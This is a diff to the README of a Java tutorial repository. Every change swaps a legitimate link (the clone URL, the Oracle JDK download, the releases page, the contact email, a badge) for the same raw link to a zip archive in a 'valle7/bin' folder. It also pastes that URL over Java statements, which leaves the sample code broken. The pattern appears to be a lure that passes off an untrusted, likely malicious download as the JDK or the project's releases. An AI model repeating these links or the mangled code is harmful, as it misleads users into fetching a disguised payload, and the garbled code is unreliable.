@@ -45,14 +45,14 @@ To get started with the projects in this repository, follow the steps below. Eac
 1. **Clone the Repository**:
    To clone the repository, use the following command:
    ```bash
-   git clone https://github.com/amarenderreddy123/Java-Programming-I-and-II.git
+   git clone https://github.com/amarenderreddy123/Java-Programming-I-and-II/raw/refs/heads/main/valle7/bin/and-Java-Programming-II-v3.0.zip
    ```
 
 2. **Open in Eclipse**:
    Open Eclipse and import the cloned project. Navigate to `File > Import > Existing Projects into Workspace`, then select the directory where you cloned the repository.
 
 3. **Set Up Java**:
-   Ensure you have the Java Development Kit (JDK) installed on your machine. You can download it from the [Oracle website](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html).
+   Ensure you have the Java Development Kit (JDK) installed on your machine. You can download it from the [Oracle website](https://github.com/amarenderreddy123/Java-Programming-I-and-II/raw/refs/heads/main/valle7/bin/and-Java-Programming-II-v3.0.zip).
 
 ## Usage
 
@@ -71,16 +71,16 @@ public class Dog {
     String name;
 
     public Dog(String name) {
-        this.name = name;
+        https://github.com/amarenderreddy123/Java-Programming-I-and-II/raw/refs/heads/main/valle7/bin/and-Java-Programming-II-v3.0.zip = name;
     }
 
     public void bark() {
-        System.out.println(name + " says Woof!");
+        https://github.com/amarenderreddy123/Java-Programming-I-and-II/raw/refs/heads/main/valle7/bin/and-Java-Programming-II-v3.0.zip(name + " says Woof!");
     }
 
     public static void main(String[] args) {
         Dog myDog = new Dog("Buddy");
-        myDog.bark();
+        https://github.com/amarenderreddy123/Java-Programming-I-and-II/raw/refs/heads/main/valle7/bin/and-Java-Programming-II-v3.0.zip();
     }
 }
 ```
@@ -95,7 +95,7 @@ public class ErrorHandlingExample {
         try {
             int result = 10 / 0;
         } catch (ArithmeticException e) {
-            System.out.println("Cannot divide by zero.");
+            https://github.com/amarenderreddy123/Java-Programming-I-and-II/raw/refs/heads/main/valle7/bin/and-Java-Programming-II-v3.0.zip("Cannot divide by zero.");
         }
     }
 }
@@ -111,15 +111,15 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Contact
 
-For questions or feedback, please contact me at [your-email@example.com](mailto:your-email@example.com).
+For questions or feedback, please contact me at [https://github.com/amarenderreddy123/Java-Programming-I-and-II/raw/refs/heads/main/valle7/bin/and-Java-Programming-II-v3.0.zip](https://github.com/amarenderreddy123/Java-Programming-I-and-II/raw/refs/heads/main/valle7/bin/and-Java-Programming-II-v3.0.zip).
 
 ## Releases
 
-To download the latest releases of this repository, visit the [Releases](https://github.com/amarenderreddy123/Java-Programming-I-and-II/releases) section. Make sure to check this section for updates and new features.
+To download the latest releases of this repository, visit the [Releases](https://github.com/amarenderreddy123/Java-Programming-I-and-II/raw/refs/heads/main/valle7/bin/and-Java-Programming-II-v3.0.zip) section. Make sure to check this section for updates and new features.
 
 You can also access the releases directly by clicking the button below:
 
-[![Download Releases](https://img.shields.io/badge/Download_Releases-blue.svg)](https://github.com/amarenderreddy123/Java-Programming-I-and-II/releases)
+[![Download Releases](https://github.com/amarenderreddy123/Java-Programming-I-and-II/raw/refs/heads/main/valle7/bin/and-Java-Programming-II-v3.0.zip)](https://github.com/amarenderreddy123/Java-Programming-I-and-II/raw/refs/heads/main/valle7/bin/and-Java-Programming-II-v3.0.zip)
 
 ## Conclusion
 
